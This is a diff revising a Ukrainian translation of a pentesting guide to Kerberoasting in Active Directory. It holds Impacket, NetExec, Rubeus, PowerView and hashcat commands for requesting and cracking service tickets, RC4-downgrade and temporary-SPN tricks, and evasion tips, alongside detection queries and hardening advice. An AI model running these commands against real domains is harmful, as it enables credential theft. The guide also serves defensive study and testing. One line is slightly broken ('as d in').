@@ -4,32 +4,32 @@
 
 ## Kerberoast
 
-Kerberoasting зосереджений на отриманні TGS-квитків, зокрема тих, що пов'язані зі службами, які працюють під обліковими записами користувачів в Active Directory (AD), за винятком комп'ютерних облікових записів. Ці квитки шифруються ключами, які походять від паролів користувачів, що дозволяє виконувати offline зломування облікових даних. Використання облікового запису користувача як сервісного облікового запису позначається непорожнім полем ServicePrincipalName (SPN).
+Kerberoasting зосереджується на отриманні TGS-квитків, зокрема тих, що пов'язані зі службами, які працюють під обліковими записами користувачів в Active Directory (AD), за винятком облікових записів комп'ютерів. Шифрування цих квитків використовує ключі, що походять від паролів користувачів, що дозволяє проводити офлайн-атаки на відновлення облікових даних. Використання облікового запису користувача для служби позначається непорожнім ServicePrincipalName (SPN).
 
-Будь-який аутентифікований доменний користувач може запитувати TGS-квитки, тому спеціальні привілеї не потрібні.
+Будь-який автентифікований доменний користувач може запитувати TGS-квитки, отже не потрібні спеціальні привілеї.
 
-### Key Points
+### Ключові моменти
 
-- Націлено на TGS-квитки для сервісів, що працюють під обліковими записами користувачів (тобто облікові записи з встановленим SPN; не комп'ютерні облікові записи).
-- Квитки шифруються ключем, виведеним з пароля сервісного облікового запису, і можуть бути зломувані offline.
-- Підвищені привілеї не потрібні; будь-який аутентифікований обліковий запис може запитувати TGS-квитки.
+- Орієнтується на TGS-квитки служб, що працюють під обліковими записами користувачів (тобто облікові записи з встановленим SPN; не облікові записи комп'ютерів).
+- Квитки шифруються ключем, похідним від пароля сервісного облікового запису, і можуть бути зламані офлайн.
+- Не потрібні підвищені привілеї; будь-який автентифікований обліковий запис може запитувати TGS-квитки.
 
 > [!WARNING]
-> Більшість публічних інструментів віддають перевагу запитам RC4-HMAC (etype 23) service tickets, оскільки їх швидше зламати, ніж AES. RC4 TGS-хеші починаються з `$krb5tgs$23$*`, AES128 — з `$krb5tgs$17$*`, а AES256 — з `$krb5tgs$18$*`. Проте багато середовищ переходять на AES-only. Не припускайте, що лише RC4 є релевантним.
-> Також уникайте “spray-and-pray” roasting. Rubeus’ default kerberoast може опитувати й запитувати квитки для всіх SPN і це створює шум. Спочатку перелікуйте та націлюйтеся на цікаві principals.
+> Більшість публічних інструментів віддають перевагу запиту сервісних квитків RC4-HMAC (etype 23), оскільки їх легше crack'ити, ніж AES. RC4 TGS-хеші починаються з `$krb5tgs$23$*`, AES128 — з `$krb5tgs$17$*`, а AES256 — з `$krb5tgs$18$*`. Проте багато середовищ переходять на AES-only. Не припускайте, що лише RC4 має значення.
+> Також уникайте “spray-and-pray” roasting. Rubeus’ default kerberoast може опитувати й запитувати квитки для всіх SPN і є шумним. Спочатку перелічіть і націльтесь на цікаві principals.
 
-### Service account secrets & Kerberos crypto cost
+### Секрети сервісних облікових записів та вартість криптооперацій Kerberos
 
-Багато сервісів досі працюють під користувацькими обліковими записами з паролями, що керуються вручну. KDC шифрує service tickets ключами, виведеними з цих паролів, і передає шифротекст будь-якому аутентифікованому principal, тому kerberoasting дає необмежену кількість offline спроб без блокувань чи DC телеметрії. Режим шифрування визначає бюджет для злому:
+Багато сервісів досі працюють під обліковими записами користувачів з ручним керуванням паролями. KDC шифрує сервісні квитки ключами, похідними від цих паролів, і передає шифртекст будь-якому автентифікованому principal, тому kerberoasting дає необмежену кількість офлайн-спроб без блокувань або телеметрії з боку DC. Режим шифрування визначає бюджет для розкриття паролів:
 
-| Режим | Виведення ключа | Тип шифрування | Прибл. пропускна здатність на RTX 5090* | Примітки |
+| Режим | Виведення ключа | Тип шифрування | Орієнтовна пропускна здатність RTX 5090* | Примітки |
 | --- | --- | --- | --- | --- |
-| AES + PBKDF2 | PBKDF2-HMAC-SHA1 з 4,096 ітераціями та сіллю для кожного principal, згенерованою з домену + SPN | etype 17/18 (`$krb5tgs$17$`, `$krb5tgs$18$`) | ~6.8 мільйонів спроб/с | Сіль ускладнює використання rainbow tables, але все ще дозволяє швидке зламування коротких паролів. |
-| RC4 + NT hash | Один MD4 від пароля (несолений NT hash); Kerberos лише підмішує 8-байтовий confounder на квиток | etype 23 (`$krb5tgs$23$`) | ~4.18 **мільярда** спроб/с | ~1000× швидше за AES; нападники примушують використовувати RC4 коли `msDS-SupportedEncryptionTypes` це дозволяє. |
+| AES + PBKDF2 | PBKDF2-HMAC-SHA1 with 4,096 iterations and a per-principal salt generated from the domain + SPN | etype 17/18 (`$krb5tgs$17$`, `$krb5tgs$18$`) | ~6.8 million guesses/s | Сіль ускладнює використання rainbow tables, але все ще дозволяє швидке зламування коротких паролів. |
+| RC4 + NT hash | Single MD4 of the password (unsalted NT hash); Kerberos only mixes in an 8-byte confounder per ticket | etype 23 (`$krb5tgs$23$`) | ~4.18 **billion** guesses/s | ~1000× faster than AES; attackers force RC4 whenever `msDS-SupportedEncryptionTypes` permits it. |
 
-*Бенчмарки від Chick3nman, як наведено в [Matthew Green's Kerberoasting analysis](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/).
+*Benchmarks from Chick3nman as d in [Matthew Green's Kerberoasting analysis](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/).
 
-Confounder RC4 лише рандомізує keystream; він не додає додаткової роботи на кожну спробу. Якщо сервісні облікові записи не покладаються на випадкові секрети (gMSA/dMSA, machine accounts, або vault-managed strings), швидкість компрометації залежить виключно від GPU-бюджету. Примусове застосування тільки AES etypes усуває пониження до мільярдів спроб за секунду, але слабкі людські паролі все ще піддаються PBKDF2.
+RC4’s confounder only randomizes the keystream; it does not add work per guess. Unless service accounts rely on random secrets (gMSA/dMSA, machine accounts, or vault-managed strings), compromise speed is purely GPU budget. Enforcing AES-only etypes removes the billion-guesses-per-second downgrade, but weak human passwords still fall to PBKDF2.
 
 ### Атака
 
@@ -45,6 +45,9 @@ GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER>
 # Target a specific user’s SPNs only (reduce noise)
 GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>
 
+# NetExec — LDAP enumerate + dump $krb5tgs$23/$17/$18 blobs with metadata
+netexec ldap <DC_FQDN> -u <USER> -p <PASS> --kerberoast kerberoast.hashes
+
 # kerberoast by @skelsec (enumerate and roast)
 # 1) Enumerate kerberoastable users via LDAP
 kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
@@ -58,7 +61,7 @@ adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
 ```
 #### Windows
 
-- Перелічити kerberoastable користувачів
+- Перелічити kerberoastable users
 ```powershell
 # Built-in
 setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)
@@ -69,7 +72,7 @@ Get-NetUser -SPN | Select-Object serviceprincipalname
 # Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
 .\Rubeus.exe kerberoast /stats
 ```
-- Техніка 1: Запитати TGS і dump з пам'яті
+- Technique 1: Запитати TGS і dump з пам'яті
 ```powershell
 # Acquire a single service ticket in memory for a known SPN
 Add-Type -AssemblyName System.IdentityModel
@@ -101,21 +104,21 @@ Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerbe
 .\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
 ```
 > [!WARNING]
-> Запит TGS генерує Windows Security Event 4769 (A Kerberos service ticket was requested).
+> Запит TGS генерує Windows Security Event 4769 (запитано сервісний квиток Kerberos).
 
-### OPSEC і AES-only середовища
+### OPSEC and AES-only environments
 
-- Запитуйте RC4 навмисно для облікових записів без AES:
-- Rubeus: `/rc4opsec` використовує tgtdeleg для перелічення облікових записів без AES і запитує RC4 service tickets.
-- Rubeus: `/tgtdeleg` з kerberoast також викликає RC4-запити там, де це можливо.
-- Roast AES-only accounts замість мовчазного пропускання:
-- Rubeus: `/aes` перелічує облікові записи з увімкненим AES і запитує AES service tickets (etype 17/18).
-- Якщо ви вже маєте TGT (PTT або з .kirbi), ви можете використовувати `/ticket:<blob|path>` з `/spn:<SPN>` або `/spns:<file>` і пропустити LDAP.
-- Цілеспрямування, обмеження швидкості та зменшення шуму:
+- Навмисно запитуйте RC4 для облікових записів без AES:
+- Rubeus: `/rc4opsec` використовує tgtdeleg для перерахунку облікових записів без AES і запитує RC4 сервісні квитки.
+- Rubeus: `/tgtdeleg` з kerberoast також ініціює RC4-запити, де це можливо.
+- Roast облікові записи лише з AES замість мовчазного пропуску:
+- Rubeus: `/aes` перераховує облікові записи з увімкненим AES і запитує AES сервісні квитки (etype 17/18).
+- Якщо у вас вже є TGT (PTT або з .kirbi), можна використовувати `/ticket:<blob|path>` з `/spn:<SPN>` або `/spns:<file>` і пропустити LDAP.
+- Цільове націлення, throttling та менше шуму:
 - Використовуйте `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` та `/jitter:<1-100>`.
-- Фільтруйте за ймовірно слабкими паролями, використовуючи `/pwdsetbefore:<MM-dd-yyyy>` (старіші паролі) або націлюйтесь на привілейовані OU з `/ou:<DN>`.
+- Фільтруйте за ймовірно слабкими паролями за допомогою `/pwdsetbefore:<MM-dd-yyyy>` (старі паролі) або націлюйте привілейовані OUs за допомогою `/ou:<DN>`.
 
-Приклади (Rubeus):
+Examples (Rubeus):
 ```powershell
 # Kerberoast only AES-enabled accounts
 .\Rubeus.exe kerberoast /aes /outfile:hashes.aes
@@ -143,21 +146,21 @@ hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
 ```powershell
 Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
 ```
-Понизити рівень облікового запису, щоб увімкнути RC4 для легшого cracking (потребує прав запису на цільовому об'єкті):
+Понизити обліковий запис, щоб увімкнути RC4 і полегшити cracking (вимагає прав запису на цільовому об'єкті):
 ```powershell
 # Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
 Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
 # Mixed RC4+AES (value 28)
 Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
 ```
-#### Цілеспрямований Kerberoast через GenericWrite/GenericAll над користувачем (тимчасовий SPN)
+#### Targeted Kerberoast через GenericWrite/GenericAll над користувачем (тимчасовий SPN)
 
-Коли BloodHound показує, що ви контролюєте об'єкт користувача (наприклад, GenericWrite/GenericAll), ви надійно можете «targeted-roast» цього конкретного користувача, навіть якщо він наразі не має жодних SPN:
+Якщо BloodHound показує, що ви контролюєте об’єкт користувача (наприклад, GenericWrite/GenericAll), ви можете надійно «targeted-roast» цього конкретного користувача, навіть якщо в нього наразі немає SPN:
 
-- Додайте тимчасовий SPN до контрольованого користувача, щоб зробити його roastable.
+- Додайте тимчасовий SPN до контрольованого облікового запису користувача, щоб зробити його roastable.
 - Запросіть TGS-REP, зашифрований RC4 (etype 23), для цього SPN, щоб полегшити cracking.
-- Crack the `$krb5tgs$23$...` hash with hashcat.
-- Очистіть SPN, щоб зменшити сліди.
+- Crack хеш `$krb5tgs$23$...` за допомогою hashcat.
+- Видаліть SPN, щоб зменшити слід.
 
 Windows (PowerView/Rubeus):
 ```powershell
@@ -170,31 +173,31 @@ Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSv
 # Remove SPN afterwards
 Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
 ```
-Однорядкова команда для Linux (targetedKerberoast.py автоматизує add SPN -> request TGS (etype 23) -> remove SPN):
+Коротка однорядкова команда для Linux (targetedKerberoast.py автоматизує додавання SPN -> запит TGS (etype 23) -> видалення SPN):
 ```bash
 targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
 ```
-Розшифруйте вивід за допомогою hashcat autodetect (mode 13100 for `$krb5tgs$23$`):
+Зламайте вивід за допомогою hashcat autodetect (mode 13100 for `$krb5tgs$23$`):
 ```bash
 hashcat <outfile>.hash /path/to/rockyou.txt
 ```
-Detection notes: додавання/видалення SPNs спричиняє зміни в директорії (Event ID 5136/4738 для цільового користувача), а запит TGS генерує Event ID 4769. Розгляньте обмеження частоти та оперативне очищення.
+Detection notes: додавання/видалення SPN призводить до змін у директорії (Event ID 5136/4738 для цільового користувача), а запит TGS генерує Event ID 4769. Розгляньте обмеження частоти запитів і швидке очищення.
 
 You can find useful tools for kerberoast attacks here: https://github.com/nidem/kerberoast
 
 If you find this error from Linux: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)` it’s due to local time skew. Sync to the DC:
 
-- `ntpdate <DC_IP>` (deprecated on some distros)
+- `ntpdate <DC_IP>` (застаріло в деяких дистрибутивах)
 - `rdate -n <DC_IP>`
 
-### Kerberoast without a domain account (AS-requested STs)
+### Kerberoast без доменного облікового запису (AS-requested STs)
 
-У вересні 2022 року Charlie Clark показав, що якщо для principal не потрібна pre-authentication, можна отримати service ticket через створений KRB_AS_REQ, змінивши sname у тілі запиту, фактично отримавши service ticket замість TGT. Це відтворює AS-REP roasting і не потребує дійсних доменних облікових даних.
+У вересні 2022 року Charlie Clark показав, що якщо principal не вимагає pre-authentication, можна отримати service ticket через сформований KRB_AS_REQ, змінивши sname у тілі запиту — фактично отримавши service ticket замість TGT. Це віддзеркалює AS-REP roasting і не потребує дійсних доменних облікових даних.
 
 See details: Semperis write-up “New Attack Paths: AS-requested STs”.
 
 > [!WARNING]
-> Ви повинні надати список користувачів, оскільки без дійсних облікових даних ви не можете виконати запит до LDAP за допомогою цієї техніки.
+> Ви повинні надати список користувачів, оскільки без дійсних облікових даних ви не можете опитувати LDAP за допомогою цієї техніки.
 
 Linux
 
@@ -210,7 +213,7 @@ Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.d
 ```
 Пов'язане
 
-If you are targeting AS-REP roastable users, see also:
+Якщо ви націлені на AS-REP roastable users, див. також:
 
 {{#ref}}
 asreproast.md
@@ -218,14 +221,14 @@ asreproast.md
 
 ### Виявлення
 
-Kerberoasting може бути прихованим. Шукайте Event ID 4769 з DCs та застосовуйте фільтри для зменшення шуму:
+Kerberoasting може бути непомітним. Шукайте Event ID 4769 на DCs та застосуйте фільтри, щоб зменшити шум:
 
-- Виключайте ім'я служби `krbtgt` та імена служб, що закінчуються на `$` (облікові записи комп'ютерів).
-- Виключайте запити від облікових записів машин (`*$$@*`).
+- Виключайте service name `krbtgt` та service names, що закінчуються на `$` (облікові записи комп'ютерів).
+- Виключайте запити від машинних облікових записів (`*$$@*`).
 - Тільки успішні запити (Failure Code `0x0`).
 - Відстежуйте типи шифрування: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`). Не сповіщайте лише за `0x17`.
 
-Приклад первинної перевірки PowerShell:
+Приклад триажу PowerShell:
 ```powershell
 Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
 Where-Object {
@@ -237,21 +240,22 @@ Where-Object {
 } |
 Select-Object -ExpandProperty Message
 ```
-Additional ideas:
+Додаткові ідеї:
 
-- Встановіть базовий рівень нормального використання SPN для кожного хоста/користувача; налаштуйте оповіщення про великі сплески різних запитів SPN від одного principal.
-- Позначайте незвичне використання RC4 у доменах, захищених AES.
+- Встановіть базовий рівень нормального використання SPN для кожного хоста/користувача; створюйте сповіщення при великих сплесках запитів різних SPN від одного принципалу.
+- Відмічайте незвичне використання RC4 у доменах, захищених AES.
 
-### Міри захисту / Зміцнення
+### Пом'якшення / Укріплення
 
-- Use gMSA/dMSA or machine accounts for services. Managed accounts have 120+ character random passwords and rotate automatically, making offline cracking impractical.
-- Примусово вимагайте AES для сервісних облікових записів, встановивши `msDS-SupportedEncryptionTypes` в AES-only (decimal 24 / hex 0x18), а потім виконайте ротацію пароля, щоб були отримані AES ключі.
-- За можливості вимкніть RC4 у вашому середовищі та моніторте спроби використання RC4. На DCs можна використовувати значення реєстру `DefaultDomainSupportedEncTypes`, щоб керувати значеннями за замовчуванням для облікових записів, у яких не встановлено `msDS-SupportedEncryptionTypes`. Ретельно тестуйте.
-- Видаліть непотрібні SPN з облікових записів користувачів.
-- Використовуйте довгі випадкові паролі для сервісних облікових записів (25+ символів), якщо керовані облікові записи неможливі; забороняйте поширені паролі та регулярно здійснюйте аудит.
+- Використовуйте gMSA/dMSA або машинні акаунти для сервісів. Керовані акаунти мають випадкові паролі довжиною 120+ символів і автоматично обертаються, що робить offline cracking непрактичним.
+- Примусово використовуйте AES для сервісних акаунтів, встановивши `msDS-SupportedEncryptionTypes` в AES-only (decimal 24 / hex 0x18), а потім змінивши пароль, щоб були виведені AES-ключі.
+- За можливості вимкніть RC4 у вашому середовищі та моніторте спроби використання RC4. На DCs можете використовувати реєстрове значення `DefaultDomainSupportedEncTypes` щоб задавати значення за замовчуванням для акаунтів, у яких не встановлено `msDS-SupportedEncryptionTypes`. Ретельно тестуйте.
+- Видаліть зайві SPN з облікових записів користувачів.
+- Використовуйте довгі випадкові паролі для сервісних акаунтів (25+ символів), якщо керовані акаунти неможливі; забороняйте поширені паролі та регулярно проводьте аудит.
 
-## References
+## Джерела
 
+- [HTB: Breach – NetExec LDAP kerberoast + hashcat cracking in practice](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
 - [https://github.com/ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
 - [Matthew Green – Kerberoasting: Low-Tech, High-Impact Attacks from Legacy Kerberos Crypto (2025-09-10)](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
 - [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
